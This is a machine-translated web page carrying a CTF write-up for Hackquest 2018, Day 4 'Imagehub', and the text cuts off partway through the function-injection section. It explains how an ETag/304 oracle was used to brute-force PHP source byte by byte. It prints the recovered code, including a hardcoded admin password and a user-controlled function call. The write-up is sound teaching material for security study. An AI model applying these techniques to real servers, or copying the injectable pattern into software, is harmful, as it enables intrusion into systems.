<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🕴🏻 🍾 🎾 Hackquest2018。结果与写作。 第4-7天 🥦 🍿 ⏲️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="按照承诺，我们将发布年度hackquest决策的第二部分。 第4-7天：紧张加剧，任务变得更加有趣！ 


 内容： 


- 第4天 图片集线器 
- 第5天 时间 
- 第6天 很棒的虚拟机 
- 第7天。 隐藏资源 

 第4天 图片集线器 
 此任务由SPbCTF准备。 

 我们的新作品将...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackquest2018。结果与写作。 第4-7天</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/440312/"> 按照承诺，我们将发布年度hackquest决策的第二部分。 第4-7天：紧张加剧，任务变得更加有趣！ <br><img src="https://habrastorage.org/webt/oa/br/8l/oabr8lkxzurvxgw-20o0jq23hgo.jpeg"><br><a name="habracut"></a><br><h2> 内容： </h2><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第4天</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">图片集线器</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第5天</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">时间</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第6天</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">很棒的虚拟机</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第7天。</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">隐藏资源</a> </li></ul><br><img src="https://habrastorage.org/webt/xv/67/n9/xv67n9j_kw2fxrljp9zrrqewzxk.jpeg"><br><h2><a name="Imagehub"></a> 第4天 图片集线器 </h2><br> 此任务由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SPbCTF</a>准备。 <br><br>  <i>我们的新作品将杀死Instagram。</i>  <i>我们仅用两个字就能说服您：</i> <i><br><br></i>  <i>1.过滤器。</i>  <i>新的前所未有的过滤器，用于您上传的图片。</i> <i><br></i>  <i>2.缓存。</i>  <i>自定义HTTP服务器可确保图像文件位于浏览器缓存中。</i> <i><br><br></i>  <i>立即尝试！</i>  <i>imagehub.spb.ctf.su</i> <i><br><br></i>  <i>运行/ get_the_flag赢。</i> <i><br></i>  <i>自定义服务器二进制文件： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">dppth</a></i> <br><br>  <b>提示</b> <br>  <i><b>10/25/2018 20:00</b></i> <i><br></i>  <i>任务没有解决。</i>  <i>添加了24小时。</i> <i><br><br></i>  <i><b>10/25/2018 17:00</b></i> <i><br></i>  <i>我们知道两个错误。</i>  <i>第一个让您获得Web应用程序源，第二个让您获得RCE。</i> <br><br><h4> 概述： </h4><br> 可执行文件： <br><br><ul><li> 精灵x86_64 </li><li> 实现简单的http服务器 </li><li> 如果请求的文件具有可执行位，则将其传递给php-fpm </li><li> 代码实现自定义etag缓存 </li></ul><br> 网页部分： <br><br><ul><li> 具有文件上传功能。 可以使用预定义的滤镜修改图像。 </li><li> 在/？Admin = show上具有Basic的管理页面 </li></ul><br><h4> 漏洞：读取源代码 </h4><br> 缓存功能似乎很有趣，因为我们可以让服务器对文件的任意范围进行哈希处理（甚至1个字节范围）。 <br><br> <code>Etag = sprintf("%08x%08x%08x", file_mtime, hash, file_size);</code> <br> <div class="spoiler">  <b class="spoiler_title">哈希函数：</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">etag_hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> v16 = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">16</span></span>)] v16[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span> v16[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x1DB71064</span></span> v16[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x3B6E20C8</span></span> v16[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x26D930AC</span></span> v16[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0x76DC4190</span></span> v16[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0x6B6B51F4</span></span> v16[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0x4DB26158</span></span> v16[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0x5005713C</span></span> v16[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0xEDB88320</span></span> v16[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0xF00F9344</span></span> v16[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0xD6D6A3E8</span></span> v16[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0xCB61B38C</span></span> v16[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0x9B64C2B0</span></span> v16[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0x86D3D2D4</span></span> v16[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0xA00AE278</span></span> v16[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0xBDBDF21C</span></span> hash = <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): v5 = ((hash &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[(hash ^ data[i]) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> hash = ((v5 &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[v5 &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span> ^ (data[i] &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>)]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (~hash) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br></div></div><br> 不幸的是，etag被剥夺了可执行文件（* .php）： <br><br><pre> <code class="plaintext hljs">stat_0(v2, &amp;stat_buf); if ( stat_buf.st_mode &amp; S_IEXEC ) { setHeader(a2-&gt;respo, "cache-control", "no-store"); deleteHeade(a2-&gt;respo, "etag"); set_environment_info(a1); dup2(fd, 0); snprintf(s, 4096, "/usr/bin/php-cgi %s", a1-&gt;url);</code> </pre> <br> 页面执行之前仍然需要进行检查，因此，如果我们正确地猜测etag值（ <b>if-none-match</b> ），则服务器将向我们提供<b>304未修改</b>状态响应。 使用此功能，我们可以逐字节逐个暴力破解源代码。 <br><br><pre> <code class="plaintext hljs">v11 = getHeader(&amp;s.request, "if-modified-since"); if ( v11 ) { v3 = getHeader(&amp;v14, "last-modified"); if ( !strcmp(v11, v3) ) send_status(304); } v12 = getHeader(&amp;s.request, "if-none-match"); if ( v12 ) { v4 = getHeader(&amp;v14, "etag"); if ( !strcmp(v12, v4) ) send_status(304); } exec_and_prepare_response_body(&amp;s, &amp;a2a);</code> </pre> <br> 让我们总结一下我们从RE中获得的收益： <br><br><ol><li> 从上次修改的响应标头（字符串-&gt;时间戳）可以轻松读取时间戳。 </li><li> 范围允许为一个字节长度（因此我们将仅获得一个字节的哈希值） </li><li> 可以猜测1个字节范围内的哈希值（256个可能的值） </li><li> 大小可以强制执行，但是我们需要从目标文件中至少知道一个字节。 </li><li> 由于我们希望获取* .php文件的源代码，因此可以很好地假设该文件以“ &lt;？Php”开头。 </li></ol><br> 第一步是获取大小，第二步是获取实际文件内容。 <br> 使用多线程代码，我达到了〜1个字符/秒的速度，并转储了一些文件： <br><div class="spoiler">  <b class="spoiler_title">index.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// error_reporting(0); if (isset($_GET["admin"]) &amp;&amp; (!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] !== '888b2f04eef9a49fc87fa81089b736de')) { header('WWW-Authenticate: Basic realm="Admin Area"'); header('HTTP/1.0 401 Unauthorized'); } require "upload.php"; $uploader = new ImageUploader(); $result = $uploader-&gt;upload(); if ($result === true) die(); if ($result &gt; 0) { echo "Error: " . $result; } if ($uploader-&gt;upload() !== true) { include "templates/main.php"; }</span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">upload.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/uploaderror.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/verify.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/filters.php"</span></span>; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ImageUploader</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> TARGET_DIR = <span class="hljs-string"><span class="hljs-string">"51a8ae2cab09c6b728919fe09af57ded/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">upload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $result = verify_parameters(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($result !== <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], $target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::MOVE_ERROR; } $text = $_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]; $filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text); $imagick = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \Imagick(realpath($target_file)); $imagick-&gt;scaleimage($size, $size); $imagick-&gt;setImageOpacity(<span class="hljs-number"><span class="hljs-number">0.5</span></span>); $imagick-&gt;compositeImage($filterImage, imagick::CHANNEL_ALPHA, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/jpeg"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $imagick-&gt;getImageBlob(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } }</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">包括/filters.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">make_text</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($image, $size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $draw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickDraw(); $draw-&gt;setFillColor(<span class="hljs-string"><span class="hljs-string">'white'</span></span>); $draw-&gt;setFontSize( <span class="hljs-number"><span class="hljs-number">18</span></span> ); $image-&gt;annotateImage($draw, $size / <span class="hljs-number"><span class="hljs-number">2</span></span> - <span class="hljs-number"><span class="hljs-number">65</span></span>, $size - <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, $text); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">futut</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incasinato</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(130,100,255,3)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fertocht</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $s = $size % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">"rgba($s,$s,$s,127)"</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">jebeno</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(0,255,255,255)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i*<span class="hljs-number"><span class="hljs-number">10</span></span>) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-($size-$j)) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">kuthamanga</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]+$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">包括/ uploaderror.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UploadError</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> POST_SUBMIT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> IMAGE_NOT_FOUND = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> NOT_IMAGE = <span class="hljs-number"><span class="hljs-number">2</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> FILE_EXISTS = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> BIG_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_EXTENSION = <span class="hljs-number"><span class="hljs-number">5</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_MIMETYPE = <span class="hljs-number"><span class="hljs-number">6</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INVALID_PARAMS = <span class="hljs-number"><span class="hljs-number">7</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_SIZE = <span class="hljs-number"><span class="hljs-number">8</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> MOVE_ERROR = <span class="hljs-number"><span class="hljs-number">9</span></span>; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">包含/ verify.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">verify_parameters</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'submit'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::POST_SUBMIT; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_FILES[<span class="hljs-string"><span class="hljs-string">'imageFile'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::IMAGE_NOT_FOUND; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $imageFileType = strtolower(pathinfo($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>], PATHINFO_EXTENSION)); $imageFileInfo = getimagesize($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($imageFileInfo === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::NOT_IMAGE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">1024</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::BIG_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!in_array($imageFileType, [<span class="hljs-string"><span class="hljs-string">'jpg'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_EXTENSION; } $imageMimeType = $imageFileInfo[<span class="hljs-string"><span class="hljs-string">'mime'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($imageMimeType !== <span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_MIMETYPE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (file_exists($target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::FILE_EXISTS; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INVALID_PARAMS; } $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($size &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) || ($size &gt; <span class="hljs-number"><span class="hljs-number">512</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br></div></div><br> 这给了我们： <br><ul><li>  Admin Basic的用户名/密码。 完全没用，它只输出字符串： <br>  <i>恭喜</i>  <i>现在您可以阅读源代码。</i>  <i>深入一点。</i> </li><li>  “ <i>过滤器</i> ”输入上的功能注入（FI）。 </li><li> 图像上传验证现在对我们来说很清楚。 </li><li> 使用ImageMagic库。 假定将其用于漏洞利用是一个死路。 我认为没有依赖FI的方法就无法利用它。 </li></ul><br><h4> 漏洞：功能注入 </h4><br> 文件<b>upload.php</b>有一些可疑代码： <br><br><pre> <code class="php hljs">$filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text);</code> </pre> <br> 我们可以将其简化为： <br><br><pre> <code class="php hljs">$filterImage = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>](intval($_GET[<span 